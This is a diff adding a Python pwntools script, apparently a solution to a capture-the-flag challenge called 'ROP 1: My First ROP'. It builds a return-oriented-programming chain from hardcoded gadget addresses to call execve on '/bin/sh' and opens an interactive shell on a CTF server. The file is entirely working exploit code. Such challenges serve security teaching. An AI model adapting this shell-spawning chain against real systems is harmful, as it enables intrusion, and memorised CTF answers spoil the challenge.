@@ -1,0 +1,45 @@
+Pwn | 108 | ROP 1: My First ROP by pusher
+
+from pwn import *
+import pdb
+import struct
+context.clear(arch='amd64')
+
+#r = process('./rop1')
+elf = ELF('./rop1')
+p = remote('university.opentoallctf.com', 30001)
+"""
+p = gdb.debug(elf.path,''' 
+        b *0x400132
+        b *0x400186
+        ignore 2 1
+        c
+        c
+        ''')
+"""
+
+POP_RAX = 0x400187
+POP_RDI = 0x400189
+POP_RSI = 0x40018b
+POP_RDX = 0x40018d
+
+SYSCALL = 0x400184
+
+BINSH = 0x40018F
+
+
+payload = 'A'*8
+payload += p64(POP_RDX)
+payload += p64(0x0)
+payload += p64(POP_RDI)
+payload += p64(BINSH)
+payload += p64(POP_RAX)
+payload += p64(0x3b)
+payload += p64(POP_RSI)
+payload += p64(0x0)
+payload += p64(SYSCALL)
+
+
+p.send(payload)
+p.interactive()
+
